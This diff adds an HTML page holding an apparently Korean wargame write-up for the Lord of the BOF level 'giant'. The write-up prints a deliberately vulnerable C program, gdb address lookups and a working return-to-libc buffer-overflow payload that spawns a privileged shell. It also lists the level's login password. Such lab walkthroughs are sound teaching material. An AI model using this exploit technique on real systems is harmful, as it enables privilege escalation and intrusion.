@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 LEVEL14 (Bugbear -> Giant) : RTL2, Only Execve</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 LEVEL14 (Bugbear -&gt; Giant) : RTL2, Only Execve | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 LEVEL14 (Bugbear -&gt; Giant) : RTL2, Only Execve" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = bugbear pw = new divide" />
+<meta property="og:description" content="id = bugbear pw = new divide" />
+<link rel="canonical" href="http://localhost:4000/2015-11-30/hackerschool-BoF-stage-14/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-30/hackerschool-BoF-stage-14/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-30T11:03:10+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = bugbear pw = new divide","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-30/hackerschool-BoF-stage-14/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 LEVEL14 (Bugbear -&gt; Giant) : RTL2, Only Execve","dateModified":"2015-11-30T11:03:10+09:00","datePublished":"2015-11-30T11:03:10+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-30/hackerschool-BoF-stage-14/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 LEVEL14 (Bugbear -> Giant) : RTL2, Only Execve</div>
+  <span class="post-date">
+    <time>30 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = bugbear</li>
+  <li>pw = new divide</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--giantc">1. 문제 : giant.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - giant
+        - RTL2
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">lib_addr</span><span class="p">,</span> <span class="o">*</span><span class="n">execve_offset</span><span class="p">,</span> <span class="o">*</span><span class="n">execve_addr</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// gain address of execve
+</span>        <span class="n">fp</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">"/usr/bin/ldd /home/giant/assassin | /bin/grep ibc | /bin/awk '{print $4}'"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+        <span class="n">sscanf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"(%x)"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lib_addr</span><span class="p">);</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+        <span class="n">fp</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">"/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+        <span class="n">sscanf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"%x"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">execve_offset</span><span class="p">);</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+        <span class="n">execve_addr</span> <span class="o">=</span> <span class="n">lib_addr</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">execve_offset</span><span class="p">;</span>
+        <span class="c1">// end
+</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">44</span><span class="p">]),</span> <span class="mi">4</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">execve_addr</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"You must use execve!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="11-변경된-코드">1.1 변경된 코드</h3>
+
+<p>앞부분에 추가된 내용은 execve() 함수의 주소를 얻기 위함이고, 주변 변경 사항은 아래와 같이 RTL 공격에 사용된 함수가 execv() 이어야 한다는 것이다.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">44</span><span class="p">]),</span> <span class="mi">4</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">execve_addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"You must use execve!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="2-공격-준비">2. 공격 준비</h2>
+
+<h3 id="21-공격-방법-고민">2.1 공격 방법 고민</h3>
+
+<h4 id="211-execve-주소--0x400a9d48">2.1.1 execve() 주소 = 0x400a9d48</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) p execve
+$1 = {&lt;text variable, no debug info&gt;} 0x400a9d48 &lt;__execve&gt;
+</code></pre></div></div>
+
+<h2 id="24-lr-확인--계속-실패-">2.4 LR 확인 : 계속 실패 ???</h2>
+
+<p>앞에서 확인한 execve() 값을 넣고 조건 체크 넘어가는지 확인.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ./giant <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*44 + "\x48\x9d\x0a\x40"'</span><span class="sb">`</span> 
+You must use execve!
+</code></pre></div></div>
+
+<p>이상하게도 execve() 값을 제대로 넣고 실행을 했은데도 계속 조건 체크 if 문제 걸려서 제대로 동작하지 않는거다… T_T; XXX 는 값을 shell 에서 evaluation 한 것인데, 현재 0x0a = New Line 으로 인하여 값이 제대로 들어가지 않는다고 한다. “XXX” 와 같이 “ 를 이용하여 모든 값을 문자열로 전달하여야 한다(고 한다.)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">&gt;</span> ./giant <span class="s2">"</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*44 + "\x48\x9d\x0a\x40"'</span><span class="sb">`</span><span class="s2">"</span>
+H
+@
+Segmentation fault
+</code></pre></div></div>
+
+<h3 id="25-stack-구성">2.5 Stack 구성</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ Buffer[40] ][ SFR ][ LR ][ ...]
+= [ Buffer[44] ][ execve() ][ system() ][ exit() ][ /bin/sh ]
+
+- execve() : 0x400a9d48
+- system() : 0x40058ae0
+- exit()   : 0x400391e0
+- /bin/sh  : 0x400fbff9
+</code></pre></div></div>
+
+<h2 id="3-exploit">3 Exploit</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">&gt;</span> ./giant <span class="s2">"</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*44 + "\x48\x9d\x0a\x40" + "\xe0\x8a\x05\x40" + "\xe0\x9a\x03\x40" + "\xf9\xbf\x0f\x40"'</span><span class="sb">`</span><span class="s2">"</span>  
+H
+@à@à@ù¿@
+
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>513<span class="o">(</span>bugbear<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>513<span class="o">(</span>bugbear<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>513<span class="o">(</span>bugbear<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="4-다음-단계-정보">4. 다음 단계 정보</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>513<span class="o">(</span>bugbear<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>513<span class="o">(</span>bugbear<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>514<span class="o">(</span>giant<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>513<span class="o">(</span>bugbear<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 514
+one step closer
+</code></pre></div></div>
+
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
